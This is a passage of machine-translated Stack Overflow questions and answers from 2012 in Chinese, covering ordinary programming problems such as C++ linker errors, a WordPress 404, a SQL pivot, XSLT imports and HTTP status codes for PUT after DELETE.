 10-29 13:10:00.936: E/AndroidRuntime(458): Caused by: android.content.res.Resources$NotFoundException: Resource is not a Drawable (color or path): TypedValue{t=0x1/d=0x7f050000 a=-1 r=0x7f050000} 
```

一些`Drawable`在一些`RelativeLayout`从`MainActivity` `setContentView()`方法？

# c++ - 未解决的外部[构造函数]

> ID：13125168
> 
> 赞同：1
> 
> 时间：2012-10-29T15:57:52.637
> 
> 标签：c++, constructor, linker, externals

> **可能重复：**
> [什么是未定义的引用/未解决的外部符号错误，我该如何解决？](https://stackoverflow.com/questions/12573816/what-is-an-undefined-reference-unresolved-external-symbol-error-and-how-do-i-fix)

我有一个我无法解决的链接器问题.. 已经尝试了我能想到的任何事情我有一个基类（人）和一个派生类（经销商），我只想从 CardStack 类中调用构造函数是 Dealer 类的成员。

这是我的代码：

人.h

```
#ifndef PERSON_H
#define PERSON_H
#include "Card.h"
#include "Hand.h"

class Person
{
public:
    Person(void);
    virtual ~Person(void);
    virtual bool TakeCard(Card c);
    virtual bool Lost(void);

protected:
    virtual void CheckLost(void);
    bool b_Lost;
    Hand m_Hand;
};
#endif 
```

经销商.h

```
 #ifndef DEALER_H
#define DEALER_H

#include "Person.h"
#include "Card.h"
#include "CardStack.h"

class Dealer : public Person
{
public:
    Dealer(int stackcount);
    virtual ~Dealer(void);
    bool TakeCard(Card c);
    bool Lost(void);
    Card GiveCard(Card c);

protected:
    void CheckLost(void);
    CardStack m_GameStack;
};
#endif 
```

经销商.cpp

```
#include "Dealer.h"

Dealer::Dealer(int stackcount) : Person(), m_GameStack(stackcount)
{

};

Dealer::~Dealer(void)
{

};

bool Dealer::TakeCard(Card c)
{
    if(!b_Lost || m_Hand.GetTotal() <= 17)
    {
        m_Hand.Take(c);
        CheckLost();
        return true;
    }

    return false;
};

void Dealer::CheckLost()
{
    if (m_Hand.GetTotal() > 21)
    {
        b_Lost = true;
    }
};

bool Dealer::Lost()
{
    return b_Lost;
}; 
```

老实说，我尝试了我能想到的一切，但我无法弄清楚错误是什么......

这是编译 Dealer.cpp 时的输出：

1>Dealer.obj : 错误 LNK2019: 函数 __unwindfunclet$??0Dealer@@QAE@H@ 中引用的未解析外部符号“public: virtual __thiscall Person::~Person(void)”(??1Person@@UAE@XZ) Z$0

1>Dealer.obj : error LNK2001: unresolved external symbol "public: virtual bool __thiscall Person::TakeCard(class Card)" (?TakeCard@Person@@UAE_NVCard@@@Z)

1>Dealer.obj : 错误 LNK2001: 无法解析的外部符号 "public: virtual bool __thiscall Person::Lost(void)" (?Lost@Person@@UAE_NXZ)

1>Dealer.obj：错误 LNK2001：未解析的外部符号“受保护：虚拟 void __thiscall Person::CheckLost(void)”(?CheckLost@Person@@MAEXXZ)

* * *

## 回答 #1

> 赞同：-2
> 
> 时间：2012-10-29T16:09:44.433

看起来您正在尝试将 Dealer.cpp 编译为自己的程序。这不起作用，因为它取决于 Person 中方法的定义，这些方法可能在 Person.cpp 中。如果您向我们展示了您用于编译的命令，那将会很有帮助。但是假设您使用的是 g++，您可能尝试做的是

```
g++ Dealer.cpp 
```

你应该做的是

```
g++ Person.cpp Dealer.cpp etc. 
```

或者

```
g++ -c Dealer.cpp
g++ -c Person.cpp 
```

等等，然后

```
g++ Dealer.o Person.o etc. 
```

# php - WordPress 触发器 404

> ID：13125169
> 
> 赞同：5
> 
> 时间：2012-10-29T15:57:56.980
> 
> 标签：php, wordpress, http-status-code-404

如何触发 404 模板显示？我做了以下...

```
$_escaped_fragment_ = $_REQUEST['_escaped_fragment_'];
$post = ( get_page_by_path($_escaped_fragment_,'','brands' ) );
if(!empty($post) ){
    setup_postdata($post);
    the_title();
    get_template_part('loop');
    wp_reset_postdata();
}else{
    get_404_template();//not working
    include( get_query_template( '404' ) );//not working...
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-29T16:00:46.753

这个怎么样？这应该有效。

```
status_header(404);
include( get_404_template() );
exit; 
```

而不是这个

```
get_404_template();//not working
include( get_query_template( '404' ) );//not working... 
```

# javascript - 解析没有子节点的 JSON 文档返回未定义

> ID：13125170
> 
> 赞同：0
> 
> 时间：2012-10-29T15:58:01.030
> 
> 标签：javascript, json, parsing

Web 服务在下面返回此 JSON

```
[
  {
"companyuserId": "2",
"name": "mike jones",
"superiorname": null,
"departmentId": "26",
"departmentname": "Design",
"companyId": "06",
"UDID": "8df912053a16ab2b4c66a",
"isActive": "1",
"devicetoken": "e8a4c1fad76b45d918f6745bfe60d32a81504",
"email": "mike@yahoo.co.uk",
"phone": "5456465465654"
  }
 ] 
```

认为这将是直截了当的

```
 name = data.name;
            phone = data.phone;
            email = data.email;
            departmentname = data.departmentname;
            companyId = data.companyId; 
```

但是我越来越不确定，我还能怎么做呢？我想也许数据可能是字符串格式，因为当我提醒数据时，我得到的结果是上面粘贴的，而不是对象：对象

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T15:59:50.530

那是一个`array of Objects`..对象是`First item`数组内部..所以你需要使用**索引**来访问它里面的对象..

所以不要`name = data.name;` 尝试这个`name = data[0].name;`

```
 name = data[0].name;
            phone = data[0].phone;
            email = data[0].email;
            departmentname = data[0].departmentname;
            companyId = data[0].companyId; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-29T16:04:40.850

您的 JSON 对象是一个对象数组，因此必须使用完全限定名称来访问它。

试试这个：

```
name = data[0].name;
phone = data[0].phone;
email = data[0].email;
departmentname = data[0].departmentname;
companyId = data[0].companyId; 
```

# php - 在 Symfony2 上调用未定义的方法 isMethod

> ID：13125181
> 
> 赞同：1
> 
> 时间：2012-10-29T15:58:34.923
> 
> 标签：php, symfony

这是我的问题，我正在关注[symfony 教程](http://symfony.com/doc/current/book/forms.html)（处理表单提交），但出现错误“调用未定义的方法 Symfony\Component\HttpFoundation\Request::isMethod()”，我无法修复它。我在一些网站上读到 isMethod 被禁止，但我找不到另一种方法来执行我的检查。谢谢。

```
use Symfony\Component\HttpFoundation\Request;

public function contactusAction(Request $request)
    {   
    $contact = new ContactUs(); 
    $form = $this->createFormBuilder($contact)
        ->add('nom', 'text')
        ->add('mail', 'email')
        ->add('sujet', 'choice', array('choices' => array('pt' => 'Problemes techniques', 'bi' => 'Boite a idees', 'd' => 'Divers')))
        ->add('msg', 'textarea')
        ->getForm();

    if ($request->isMethod('post')) 
    {
        $form->bind($request);

        if ($form->isValid()) 
        {
            echo 'OK!';         
            //return $this->redirect($this->generateUrl('task_success'));
        }
        else
            echo 'KO!!';
        }

    return $this->render('MyCoreBundle:Info:contactus.html.twig', array('form' => $form->createView()));
        //return array();
    }} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-29T16:07:09.723

将 Symfony 更新到最新版本或使用

```
if ('POST' === $request->getMethod()) 
```

另外，请注意比较的方法字符串应该是大写的。

# bash - 期望返回相同的值

> ID：13125183
> 
> 赞同：-1
> 
> 时间：2012-10-29T15:58:43.080
> 
> 标签：bash, tcl, expect

我需要能够在第一个密码失败后返回不同的密码，这将是第二次提示要求输入相同的期望值“密码：”

```
(expect -c "

 #exp_internal 1
  set passwords {PASS1 PASS2}
  set index 0 
  set timeout 20
  # Start the session with the input variable and the rest of the hostname
  spawn telnet $host
  set timeout 3 
  expect {
-ex     \"Password:\" {
            send \"[lindex $passwords $index]\r\"
            incr index  
 exp_continue;
  }
  } 
```

我只是无法让它工作。看起来`lindex`发送中没有任何内容：

```
 -ex     "Password:" {
    send "[lindex  ]\r" 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-30T13:57:54.957

问题是您使用双引号对期望脚本进行分组 - bash 将`$variables`as *bash 变量*解释为。您需要：

1.  使用单引号来分隔脚本，或者
2.  逃避所有这些，`\$expect_variables`所以 bash 不会首先替换它们。

# api - HTTP PUT 和 DELETE 的幂等性

> ID：13125185
> 
> 赞同：8
> 
> 时间：2012-10-29T15:58:54.320
> 
> 标签：api, http, rest, asp.net-web-api

所以 HTTP 规范说 HTTP PUT 和 DELETE 应该是幂等的。这意味着，对具有相同正文的相同 URL 的多个 PUT 请求不应在服务器上产生额外的副作用。多个 HTTP DELETE 也是如此，如果将 2 个或多个 DELETE 请求发送到同一个 URL，则第二个（或第三个等）请求不应返回指示资源已被删除的错误。

但是，在处理完 DELETE 之后对 URI 的 PUT 请求呢？它应该返回 404 吗？

例如，考虑以下请求按此顺序执行：

*   POST /api/items - 创建一个`item`资源，返回 HTTP 201 和 URI /api/items/6
*   PUT /api/items/6 - 更新与`item`#6相关的数据
*   PUT /api/items/6 - 只要请求正文与之前的 PUT 相同，就没有副作用
*   DELETE /api/items/6 - 删除`item`#6 并返回 HTTP 202
*   DELETE /api/items/6 - 没有副作用，还返回 HTTP 202
*   **GET /api/items/6 - 现在将返回 404**
*   PUT /api/items/6 -**这里应该发生什么？404？409？别的东西？**

那么，PUT 是否应该与 get 一致并返回 404，或者像@CodeCaster 建议的那样，409 是否更合适？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-10-29T16:02:40.903

> **[RFC 2616](https://www.rfc-editor.org/rfc/rfc2616#section-9.6)，第 9.6 节，PUT：**

> POST 和 PUT 请求的根本区别体现在 Request-URI 的不同含义上。POST 请求中的 URI 标识将处理封闭实体的资源。该资源可能是一个数据接受进程，一个通往其他协议的网关，或者一个接受注释的单独实体。相比之下，PUT 请求中的 URI 标识了请求中包含的实体——**用户代理知道 URI 的意图，服务器不得尝试将请求应用于其他资源。**

和：

> 如果无法使用 Request-URI 创建或修改资源，则应给出反映问题性质的适当错误响应。

所以定义'合适'就是看400系列，说明有客户端错误。首先，我将消除不相关的：

*   **400 Bad Request**：由于语法错误，服务器无法理解该请求。
*   **401 Unauthorized**：请求需要用户认证。
*   **402 需要付款**：此代码保留供将来使用。
*   **406 Not Acceptable**：根据请求中发送的接受标头，请求标识的资源 [...] 不可接受。
*   **407 Proxy Authentication Required**：此代码 [...] 表示客户端必须首先通过代理验证自己。
*   **408 Request Timeout**：客户端在服务器准备等待的时间内没有产生请求。
*   **411 Length Required** : 服务器拒绝接受没有定义 Content-Length 的请求。

那么，我们可以使用哪些？

> [**403 禁止**](https://www.rfc-editor.org/rfc/rfc2616#section-10.4.4)

> 服务器理解请求，但拒绝执行。授权将无济于事，并且不应重复请求。

这个描述实际上非常适合，尽管它通常用于与权限相关的上下文中（例如：您可能不会......）。

> [**404 未找到**](https://www.rfc-editor.org/rfc/rfc2616#section-10.4.5)

> 服务器未找到任何与请求 URI 匹配的内容。没有说明这种情况是暂时的还是永久性的。如果服务器通过一些内部可配置的机制知道旧资源永久不可用并且没有转发地址，则应该使用 410 (Gone) 状态代码。当服务器不希望确切地揭示请求被拒绝的原因或没有其他响应适用时，通常使用此状态代码。

这个也是，尤其是最后一行。

> [**405 方法不允许**](https://www.rfc-editor.org/rfc/rfc2616#section-10.4.6)

> Request-URI 所标识的资源不允许使用 Request-Line 中指定的方法。响应必须包含一个 Allow 标头，其中包含所请求资源的有效方法列表。

没有我们可以响应的有效方法，因为我们现在不希望在这个资源上执行任何方法，所以我们不能返回 405。

> [**409 冲突**](https://www.rfc-editor.org/rfc/rfc2616#section-10.4.10)

> 响应 PUT 请求时最有可能发生冲突。例如，如果正在使用版本控制并且**被 PUT 的实体包含对资源的更改，这些更改与早期（第三方）请求所做的更改相冲突**，则服务器可能会使用 409 响应来指示它无法完成请求. 在这种情况下，响应实体可能会以响应 Content-Type 定义的格式包含两个版本之间差异的列表。

但这假设在 URI 上已经有一个资源（怎么可能有冲突呢？）。

> [**410 走了**](https://www.rfc-editor.org/rfc/rfc2616#section-10.4.11)

> 请求的资源在服务器上不再可用，并且不知道转发地址。预计这种情况将被视为永久性的。具有链接编辑能力的客户端应该在用户批准后删除对 Request-URI 的引用。如果服务器不知道或无法确定条件是否是永久的，则应该使用状态代码 404（未找到）。

这个也有道理。

* * *

我已经编辑了这篇文章几次，当它声称“使用 410 或 404”时它被接受了，但现在我认为 403 也可能适用，因为 RFC 没有说明 403 必须与权限相关（但它似乎是由流行的 Web 服务器以这种方式实现的）。我想我已经消除了所有其他 400 个代码，但请随时发表评论（在您投反对票之前）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-30T18:55:01.080

您的问题有一个未说明的假设前提，即*资源必须存在才能使 PUT 成功。* 这不是一个有效的假设。

规范的相关部分（RFC2616）说：

> **用户代理知道 URI 的意图，服务器不得尝试将请求应用于其他资源。**

规范没有说，“引用的 URI 上的对象必须已经存在才能使对该 URI 的 PUT 成功。”

* * *

简单的示例是通过 REST 实现的网络商店。 `GET`返回给定路径处对象的表示，同时`DELETE`删除给定路径处的项目。这些很容易。但是 POST 和 PUT 并不难理解。`POST`可以做任何事情，但一种用法是`POST`在客户端指定的容器中创建一个对象，并让服务器返回该容器中新创建的对象的 URI。`PUT`更有限；它为服务器提供给定 URI 处对象的表示。该对象可能已经存在，也可能不存在。`PUT`不是 REPLACE 的同义词。

在我看来，409 或 410 对于 PUT 来说是错误的，除非容器本身——你要放入的东西不存在。

所以：

```
POST /container
   ==> returns 200 with `Location:/container/resource-12345`

PUT /container/resource-98928
   ==> returns 201 CREATED or 200 OK

PUT /this-container-does-not-exist/resource-22828282
   --> returns 400 
```

Of course it is up to you, whether you'd like your server to allow these PUT semantics. But there's nothing in the spec that says you must not allow clients to provide the URI of the resource that he is PUTting.

# sql - sql查询以选择特定格式的记录（使用pivot或其他）

> ID：13125187
> 
> 赞同：0
> 
> 时间：2012-10-29T15:58:57.060
> 
> 标签：sql, sql-server-2008, pivot

我有一个这样的 SQL 表：

```
Animal1       Animal2       Corelation
---------+---------------+--------------
Cat             Cat           1       
Cat             Dog           0.6     
Cat             Mouse         0.8     
Dog             Cat           0.6 
Dog             Dog           1    
Dog             Mouse         0.4      
Mouse           Cat           0.8     
Mouse           Dog           0.4     
Mouse           Mouse         1 
```

* * *

我正在寻找一个 SQL 查询来返回以下结果：

```
Animal 1       Cat              Dog               Mouse
---------+---------------+------------------+---------------+
Cat            1                  0.6               0.8
Dog            6                  1                 0.4
Mouse          0.8                0.4               1 
```

基本上我想要更易读的表格版本。

我尝试像这样使用枢轴：

```
use SymbolsDB
select * from [AnimalsTable]
pivot (
   [Corelation]
   for [Animal2] in (select * from [Animal2]
) 
```

但它不起作用。我不确定我是否了解枢轴的工作原理以及是否可以在我的情况下使用它。还是有其他方法可以做到这一点？（我试图避免循环，因为我有 100 万条记录）

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T16:04:16.320

您不能在`SELECT`中放置语句`PIVOT`来返回值列表，则必须是常量。如果您正在寻找动态`PIVOT`，那么您将需要使用以下内容：

```
DECLARE @cols AS NVARCHAR(MAX),
    @query  AS NVARCHAR(MAX)

select @cols = STUFF((SELECT distinct ',' + QUOTENAME(Animal2) 
                    from animals
            FOR XML PATH(''), TYPE
            ).value('.', 'NVARCHAR(MAX)') 
        ,1,1,'')

set @query = 'SELECT Animal1, ' + @cols + ' from 
             (
                select animal1, animal2, Corelation
                from animals
            ) x
            pivot 
            (
                min(Corelation)
                for animal2 in (' + @cols + ')
            ) p '

execute(@query) 
```

请参阅[带有演示的 SQL Fiddle](http://sqlfiddle.com/#!3/5b713/6)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T16:02:37.807

在数据透视表中，**列名必须是常量**。

所以要做到这一点，你需要使用动态 SQL。

```
declare @options varchar(max) = ''
select @options  = @options + ', [' + animal2 + ']' from (select distinct animal2 from animals) v
select @options = substring(@options ,2, LEN(@options))

declare @sql nvarchar(4000) =
   'select * from [AnimalsTable] pivot (max([Corelation])
   for [Animal2] in (' + @options + ')) p'

   exec sp_executesql @sql 
```

# java - 当一个 XSLT 导入另一个 XSLT 时出现 MalformedURLException

> ID：13125188
> 
> 赞同：3
> 
> 时间：2012-10-29T15:59:00.140
> 
> 标签：java, xslt, rad

我遇到一个问题，即一个 XSLT 文件导入另一个文件，导致我的应用程序抛出 MalformedURLException。中的导入语句`main.xsl`如下所示：

```
<xsl:import href="transformCommon.xsl"/> 
```

该文件`transformCommon.xsl`与`main.xsl`. 尝试加载它的代码如下所示：

```
private void loadXSLTFiles(String xsltFile)
{
    TransformerFactory transformFactory = TransformerFactory.newInstance();  

    //tell the location of all of import file 
    transformFactory.setURIResolver(new ClassPathURIResolver());

    Templates cache=null;

    //cache XSLT source file for transformation reuse
    InputStream is = this.getClass().getClassLoader().getResourceAsStream(xsltFile);
    javax.xml.transform.Source xsltSource = new javax.xml.transform.stream.StreamSource(is);

    try
    {
        cache = transformFactory.newTemplates(xsltSource);
    }
    catch (TransformerConfigurationException domException)
    {
        LOG.logError("XSLT initialization error has occurred: " + domException.getMessage());
    }
    ... 
```

堆栈跟踪是：

```
引起：java.net.MalformedURLException
    在 java.net.URL.(URL.java:602)
    在 java.net.URL.(URL.java:465)
    在 java.net.URL.(URL.java:414)
    在 org.apache.xerces.impl.XMLEntityManager.setupCurrentEntity（未知来源）
    在 org.apache.xerces.impl.XMLVersionDetector.determineDocVersion（未知来源）
    在 org.apache.xerces.parsers.XML11Configuration.parse（未知来源）
    在 org.apache.xerces.parsers.XML11Configuration.parse（未知来源）
    在 org.apache.xerces.parsers.XMLParser.parse（未知来源）
    在 org.apache.xerces.parsers.AbstractSAXParser.parse（未知来源）
    在 org.apache.xerces.jaxp.SAXParserImpl$JAXPSAXParser.parse（未知来源）
    在 org.apache.xalan.templates.StylesheetRootProxy.（未知来源）
    ... 59 更多

```

我不确定为什么会收到此错误。当我从中删除导入时`main.xsl`，一切正常。当然，删除它不是一种选择，因为这样做的全部目的是将常用函数移动到单独的 XSLT。

同样有趣的是，似乎只有我的工作站有这个问题。最初编写此代码的开发人员说他对此没有任何问题。我正在使用 RAD 7.5。有谁知道这个问题是如何出现的，在逐个工作站的基础上？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-29T16:58:49.643

为了能够解析样式表（包括导入）中的相对 URL `Source`，您`Templates`需要从中创建“系统 ID”（即`.xsl`文件的 URL）。

代替

```
//tell the location of all of import file 
transformFactory.setURIResolver(new ClassPathURIResolver());

//cache XSLT source file for transformation reuse
InputStream is = this.getClass().getClassLoader().getResourceAsStream(xsltFile);
javax.xml.transform.Source xsltSource = new javax.xml.transform.stream.StreamSource(is); 
```

试试这个：

```
URL xsltURL = this.getClass().getClassLoader().getResource(xsltFile);
Source xsltSource = new StreamSource(xsltURL.openStream(),
                                     xsltURL.toExternalForm()); 
```

（`openStream`可以抛出`IOException`，因此您需要将其添加到您的`throws`或将整个事物包装在 try/catch 中）。

# java - 我的 int 的字节数

> ID：13125189
> 
> 赞同：1
> 
> 时间：2012-10-29T15:59:02.050
> 
> 标签：java, byte

我想知道我的整数字节的大小。例子 ：

```
public static void main(String[] args) throws IOException {
   int a = 256;
   System.out.println(nbBytes(a));
}

static byte nbBytes(int value) {
   byte l = 0;
   while (value != 0) {
      value >>>= 8;
      ++l;
   }
   return l;
} 
```

它工作得很好，但我想优化这个计算。你有提议吗？:D

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T16:21:31.400

如果您指的是运行时性能，那么以下算法（最初找到最高设置位）可能是最快的。我已经修改它以返回编码整数参数所需的字节数：

```
private static final int[] DE_BRUIJN_BIT_POSITION_LUT = {
      0, 9, 1, 10, 13, 21, 2, 29, 11, 14, 16, 18, 22, 25, 3, 30,
      8, 12, 20, 28, 15, 17, 24, 7, 19, 27, 23, 6, 26, 5, 4, 31
    };

public static int nbBytes2(int n) {
    n |= n >> 1;  
    n |= n >> 2;
    n |= n >> 4;
    n |= n >> 8;
    n |= n >> 16;
    return DE_BRUIJN_BIT_POSITION_LUT[((n * 0x07C4ACDD) >> 27) & 0x1f] / 8 + 1;
} 
```

即使它看起来更复杂，它也没有任何循环或条件处理，从而可以优化使用现代 CPU 管道。

将 De Bruijn 算法与您的方法进行比较，您的方法对于 0x0-0xff 范围内的输入要快约 4 倍（您的方法也不会分支）。对于 0x100-0xfff 范围内的输入，我的方法快 19 倍，输入 0x10000-0xffffff 快 28 倍，输入 >0x1000000 快 35 倍。所有数字都对我的硬件有效，在其他计算机上它当然可能不同。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-29T16:01:53.633

在 Java 中，an`int`始终是 32 位有符号的 2 补码值。例如，参见[Java 虚拟机规范的第 2.3 节](http://docs.oracle.com/javase/specs/jvms/se7/html/jvms-2.html#jvms-2.3)。

如果您想知道存储特定值的最小位数，可以使用`Integer.numberOfLeadingZeros`以下方法获得：

```
int bitsNeeded = 32 - Integer.numberOfLeadingZeros(value); 
```

然后，您可以四舍五入以获得所需的字节数。

如果您运行的是不包含此功能的旧版 Java，这里是它的 1.6 源代码：

```
public static int numberOfLeadingZeros(int i) {
    if (i == 0)
        return 32;
    int n = 1;
    if (i >>> 16 == 0) { n += 16; i <<= 16; }
    if (i >>> 24 == 0) { n +=  8; i <<=  8; }
    if (i >>> 28 == 0) { n +=  4; i <<=  4; }
    if (i >>> 30 == 0) { n +=  2; i <<=  2; }
    n -= i >>> 31;
    return n;
} 
```

我认为，这是否比你已经在做的更有效只能通过分析来确定。它还取决于您期望遇到的值的分布。

如果您只希望处理非负值，我会这样做：

```
static byte nBytes(int value) {
    if (value < (1 << 8)) return 1;
    if (value < (1 << 16)) return 2;
    if (value < (1 << 24)) return 3;
    return 4;
} 
```

这假设您需要 1 个字节来表示零。要处理负数，有两种逻辑选择：

1.  总是返回 4
2.  返回表示 2 的补码中的值所需的最小字节数。

对于第二种情况，我会执行以下操作：

```
static byte nBytes(int value) {
    if (value < 0) {
        if (value > Integer.MIN_VALUE) {
            value = -value;
            if (value < (1 << 7)) return 1;
            if (value < (1 << 15)) return 2;
            if (value < (1 << 23)) return 3;
        }
    } else {
        if (value < (1 << 8)) return 1;
        if (value < (1 << 16)) return 2;
        if (value < (1 << 24)) return 3;
    }
    return 4;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-29T16:07:02.390

我不知道这是更优化的，但另一种解决方案类似于（未测试）：

```
return (byte)Math.ceil(Integer.toBinaryString(value).length()/8.0); 
```

# asp.net - ASP.NET 中 HTTP 和 HTTPS 页面之间的 Request.Form

> ID：13125193
> 
> 赞同：1
> 
> 时间：2012-10-29T15:59:04.693
> 
> 标签：asp.net, http, post, https, request.form

我有一个奇怪的情况，谷歌没有帮助我。我有一个管理站点，它采用简单的 HTTP，将数据发布到在 HTTPS 下运行的不同站点。HTTP 管理站点（我没有直接访问权限）正在通过基本 POST 发送信息，我正在尝试捕获 HTTPS 站点中的 Request.Form 值。由于接收站点未在 SSL 下运行，因此它在开发中运行良好，但在生产中，我将 Request.Form 设置为空。有人可以启发我吗？基本的 HTTPS 请求代码如下：

```
Dim nvm As NameValueCollection = Request.Form
Dim _idInscricao As String
Dim _Origem As String

litMensagem.Text = "Wait..."

    If nvm.Keys.Count = 0 Then
        litMensagem.Text = "Error recovering data. No keys found."
        Exit Sub
    End If

    For Each _Key As String In nvm.Keys
        If _Key.ToLower.EndsWith("idinscricao") Then
            _idInscricao = nvm(_Key)
        End If
        If _Key.ToLower.EndsWith("origem") Then
            _Origem = nvm(_Key)
        End If
    Next

    If _idInscricao Is Nothing OrElse String.IsNullOrEmpty(_idInscricao) _
        OrElse _Origem Is Nothing OrElse String.IsNullOrEmpty(_Origem) Then
        litMensagem.Text = "Error recovering data."
        Exit Sub
    End If 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-08T18:41:45.660

我发现这个问题是因为我遇到了同样的问题，我需要感谢 dana 的提琴手推荐。

使用 Fiddler，我发现了发生了什么。我的页面在 HTTPS 上，而我发布的表单发布到 HTTP。我无法弄清楚为什么我发布页面上的表单结构是空的。

结果服务器找不到文件的 http 版本并自动重定向到 https 版本，使用我的表单变量执行 GET。它们在带有 GET 的表单范围内不可用。（FWIW，我正在使用 CFML。）

一旦我将表单操作更改为发布到 HTTPS，一切都像魅力一样。

-杰森

# php - PHP in_array 函数不适用于循环中的多维数组

> ID：13125204
> 
> 赞同：1
> 
> 时间：2012-10-29T15:59:54.617
> 
> 标签：php, arrays, foreach

我有一个数组，其中包含“formname”作为$key。当我执行以下功能时：

```
 function in_array_r($needle, $arr, $strict = true) {
    $form_id = $lead['form_id'];
                $user_id = $lead['id'];
                $attachments = array();
$arr=get_defined_vars();
$needle="formna1me";
    foreach ($arr as $item) {
        if (($strict ? $item === $needle : $item == $needle) || (is_array($item) && in_array_r($needle, $item, $strict))) {
            echo "found"; exit;
        }
    }

    echo "notfound"; exit;
} 
```

它应该返回“找到”。但是，如果我将其更改`$needle`为`$needle = "bbrubrcuyrfbur"`它也会返回找到。它只是总是返回发现？不知道出了什么问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T16:50:23.930

您正在递归调用该函数。即使您使用`needle`as调用该函数`bbrubrcuyrfbur`，在条件下该函数也使用as`if`递归调用。 `needle``formna1me`

在第一次递归中，`$arr=get_defined_vars();`将读取`$needle`as的值`formna1me`。然后`$needle`将被重新分配`formna1me`，条件`if`将`formna1me`与`$needle`.`$args`

第 2 到 6 行可能不应该在该函数中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T16:03:52.513

is_array 应该像下面一样工作，您正在检查 is_array 而不是数组中的项目

```
$yes = array('this', 'is', 'an array');

echo is_array($yes) ? 'Array' : 'not an Array'; 
```

is_array 正在做的是

[`is_array`](http://php.net/manual/en/function.is-array.php)— 判断变量是否为数组

作为你的评论

to find that the value is in array try [`in_array`](http://php.net/manual/en/function.in-array.php)— 检查一个值是否存在于数组中

```
$arr = array("Mac", "NT", "msc", "Linux");
if (in_array("Linux", $arr)) {
   echo 'yes it is';
} 
```

# android - Android 3.0 中的标签样式指南是什么？

> ID：13125205
> 
> 赞同：2
> 
> 时间：2012-10-29T15:59:56.497
> 
> 标签：android, styles, icons, android-tabs, design-guidelines

下一个网站解释和指导如何在 android 上设置标签和图标的样式，直到 Android 3.0 (honeycomb)，不包括这个版本：

*   [http://android-ui-utils.googlecode.com/hg/asset-studio/dist/icons-tab.html](http://android-ui-utils.googlecode.com/hg/asset-studio/dist/icons-tab.html)
*   [http://developer.android.com/guide/practices/ui_guidelines/icon_design_tab.html](http://developer.android.com/guide/practices/ui_guidelines/icon_design_tab.html)
*   [http://developer.android.com/design/style/iconography.html](http://developer.android.com/design/style/iconography.html)

但我找不到 Android 3.0 及更高版本的指南。他们在哪里？

此外，是否还有其他需要阅读的缺失指南？

我要使用的选项卡适用于同时具有选项卡和 viewPager 的活动（如兼容性包的选项卡寻呼机示例）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T16:08:49.197

您可以在其中找到指南的 Android 设计于 2012 年 1 月推出。在此之前，Google 没有说明我们必须遵循哪些指南。这就是你在 android 3.0 之前找不到指南的原因。

这已经足够了：http: [//developer.android.com/design/index.html](http://developer.android.com/design/index.html)

编辑：这个：http: [//developer.android.com/distribute/googleplay/quality/tablet.html](http://developer.android.com/distribute/googleplay/quality/tablet.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-30T12:43:20.200

找到了这个：

[http://android-ui-utils.googlecode.com/hg/asset-studio/dist/icons-actionbar.html#source.space.trim=1&source.space.pad=0&name=example&theme=light](http://android-ui-utils.googlecode.com/hg/asset-studio/dist/icons-actionbar.html#source.space.trim=1&source.space.pad=0&name=example&theme=light)

不确定它是否适用于 android 3.0 及更高版本的标签。因为它是用于操作栏的，所以它可能是正确的。

# java - Java 是否有办法让非库开发人员使用扩展方法？

> ID：13125210
> 
> 赞同：8
> 
> 时间：2012-10-29T16:00:09.803
> 
> 标签：java, extension-methods

C# 的扩展方法非常适合添加语法糖。Java 扩展方法非常适合允许库开发人员向他们的接口添加方法。

我是一名非库 Java 开发人员，我知道从库中获取新功能会带来很多好处，但我仍然希望拥有 C# 扩展方法的语法糖功能。

是这样，还是在未来的 Java 版本中会这样？

例如：我想向 String 类添加方法...

```
String data = StringUtils.capitalize("abcd");  // instead of this
String data = "abcd".capitalize()  // I would like to do this 
```

请不要专注于这个特定的示例，我只是展示我希望能够实现的功能类别。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-29T16:06:14.537

Java 没有这个特性，也不太可能很快拥有它。

[然而， Groovy](http://groovy.codehaus.org/)确实有一个[非常相似的特性](http://groovy.codehaus.org/JN3525-MetaClasses)，它也可以在 JVM 上运行。也许这是一个选择。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-29T16:24:24.897

我怀疑您正在考虑对 Java 8 进行计划添加，它允许您向*接口*添加具有默认实现的方法——这样您就可以在不破坏所有现有代码的情况下添加新方法。如果您控制接口类型，这仅对您有用 - 所以它不会用于`String`，因为`String`它不是接口。

# ruby-on-rails - 活动模型序列化器 belongs_to

> ID：13125214
> 
> 赞同：28
> 
> 时间：2012-10-29T16:00:18.750
> 
> 标签：ruby-on-rails, active-model-serializers

*这个问题与 AMS 0.8 相关*

我有两个模型：

```
class Subject < ActiveRecord::Base
  has_many :user_combinations
  has_ancestry
end

class UserCombination < ActiveRecord::Base
  belongs_to :stage
  belongs_to :subject
  belongs_to :user
end 
```

和两个序列化器：

```
class UserCombinationSerializer < ActiveModel::Serializer
      attributes :id
      belongs_to :stage
      belongs_to :subject
end

class SubjectSerializer < ActiveModel::Serializer
  attributes :id, :name, :description, :subjects

  def include_subjects?
    object.is_root?
  end

  def subjects
    object.subtree
  end
end 
```

当 a`UserCombination`被序列化时，我想嵌入整个主题子树。

当我尝试使用此设置时，我收到此错误：

```
undefined method `belongs_to' for UserCombinationSerializer:Class 
```

我尝试将其更改`UserCombinationSerializer`为：

```
class UserCombinationSerializer < ActiveModel::Serializer
